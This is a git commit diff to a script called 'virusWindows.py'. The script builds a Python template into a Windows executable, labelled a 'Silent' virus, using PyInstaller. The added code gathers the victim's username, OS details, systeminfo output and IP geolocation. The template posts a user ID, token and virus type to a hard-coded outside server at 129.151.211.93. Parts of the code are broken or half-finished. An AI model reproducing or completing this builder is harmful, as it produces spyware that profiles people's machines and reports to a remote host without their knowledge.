5a60ff8eb1c2fc807a01ddc544d46f4bcab0e99f
IngvarOlsen <ingvarolsen57@hotmail.com>
2023-05-24 20:52:36 +0200

    working windows compile with output info

--- virusWindows.py
+++ virusWindows.py
@@ -1,5 +1,8 @@
 import subprocess
 import argparse
+import json
+from collections import defaultdict
+import subprocess
 
 # Boilerplate template with placeholders for parameters
 template = """
@@ -7,6 +10,88 @@ import pkgutil
 import requests
 import tempfile
 import os
+import getpass
+import platform
+import json
+import subprocess
+subprocess.call('dir', shell=True) 
+from collections import defaultdict
+
+# Get the operating system name
+os_name = platform.system()
+print("Operating System:", os_name)
+
+# Get the release version
+os_release = platform.release()
+print("Release Version:", os_release)
+
+# Get the machine architecture
+os_architecture = platform.machine()
+print("Machine Architecture:", os_architecture)
+
+#Other machine stuff
+print("Other machine stuff")
+print(platform.uname())
+
+# Get the current username
+username = getpass.getuser()
+print("Username:", username)
+
+# Make an API request to obtain IP geolocation information
+ipResponse = requests.get('http://ip-api.com/json')
+ipData = ipResponse.json()
+print(ipData)
+
+# Print the IP location details
+print("IP:", ipData['query'])
+print("Status:", ipData['status'])
+print("Country:", ipData['country'])
+print("Country Code:", ipData['countryCode'])
+print("Region:", ipData['region'])
+print("Region Name:", ipData['regionName'])
+print("City:", ipData['city'])
+print("Zip:", ipData['zip'])
+print("Latitude:", ipData['lat'])
+print("Longitude:", ipData['lon'])
+print("Timezone:", ipData['timezone'])
+print("ISP:", ipData['isp'])
+print("Organization:", ipData['org'])
+print("AS:", ipData['as'])
+
+
+
+
+
+def get_system_info():
+    # Execute the systeminfo command
+    process = subprocess.Popen('systeminfo', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+    output, error = process.communicate()
+
+    if process.returncode == 0:
+        # Convert the output to string and split it into lines
+        lines = output.decode().splitlines()
+
+        # Parse the relevant information
+        system_info = {system_info}
+        for line in lines:
+            if ':' in line:
+                key, value = line.split(':', 1)
+                system_info[key.strip()] = value.strip()
+
+        return system_info
+    else:
+        print("Error executing systeminfo command: " + error.decode())
+        return None
+
+# Example usage
+info = get_system_info()
+if info:
+    print("System Information:")
+    for key, value in info.items():
+        print(key + " : " + value)
+
+
+
 
 # Read the cert data
 cert_data = pkgutil.get_data('certifi', 'cacert.pem')
@@ -24,23 +109,25 @@ def display_message(user_id, virus_type):
 
 def send_request(user_id, token, virus_type, name, heartbeat_rate):
     url = 'http://129.151.211.93:5000/update'
-    data = {{
+    dataToSend = {{
         'user_id': '{user_id}',
         'token': '{token}',
         'virus_type': '{virus_type}',
         'name': '{name}',
         'heartbeat_rate': '{heartbeat_rate}',
     }}
-    response = requests.post(url, json=data)
+    response = requests.post(url, json=dataToSend)
     logging.debug(f'Response status code: response.status_code')
     logging.debug(f'Response content: response.content')
     os.system('echo response.status_code , response.content && pause'.format(response.status_code, response.content))
     s.system('echo cmd testt && pause')
 
-#os.system('echo Trying to send request)
-send_request(user_id='{user_id}', token='{token}', virus_type='{virus_type}', name='{name}', heartbeat_rate='{heartbeat_rate}')
-#os.system('echo Displaying message)
+os.system('echo Displaying message')
 display_message(user_id='{user_id}', virus_type='{virus_type}')
+os.system('echo Trying to send request')
+send_request(user_id='{user_id}', token='{token}', virus_type='{virus_type}', name='{name}', heartbeat_rate='{heartbeat_rate}')
+
+raw_input("Program crashed; press Enter to exit")
 
 # Clean up the temp file
 os.remove(handle.name)
@@ -52,7 +139,7 @@ def test():
 def generateExe(source_file):
     # Call PyInstaller to compile the script to an exe
     try:
-        subprocess.check_call(['python', '-m','PyInstaller', '--clean', '--debug=all', '--distpath', '/dist', '--hidden-import=requests', '--hidden-import=stringprep', source_file])
+        subprocess.check_call(['python', '-m','PyInstaller', '--debug=all', '--distpath', '/dist', '--hidden-import=requests', '--hidden-import=stringprep', source_file])
         return "Success"
     except subprocess.CalledProcessError as e:
         print(f"PyInstaller failed with error code: {e.returncode}")
@@ -60,12 +147,19 @@ def generateExe(source_file):
 
 def generateScript(user_id, token, virus_type, name, heartbeat_rate):
     # Fill in the template with the provided parameters
+    # Initialize an empty JSON object
+    empty_data = json.loads("{}")
+    
+
     filled_template = template.format(
         user_id=user_id,
         token=token,
         virus_type=virus_type,
         name=name,
-        heartbeat_rate=heartbeat_rate
+        heartbeat_rate=heartbeat_rate,
+        ipData=empty_data,  # Empty placeholder for ipData
+        system_info=empty_data
+        
     )
 
     # Write the filled-in template to a new Python script
@@ -77,7 +171,7 @@ def generateScript(user_id, token, virus_type, name, heartbeat_rate):
         f.write(filled_template)
 
 generateScript(1, '1234567890', 'Silent', 'TestVirus1', '1h')
-# Wine compile test
+#compile test
 generateExe("generated_script.py")
 
 # if __name__ == '__main__':
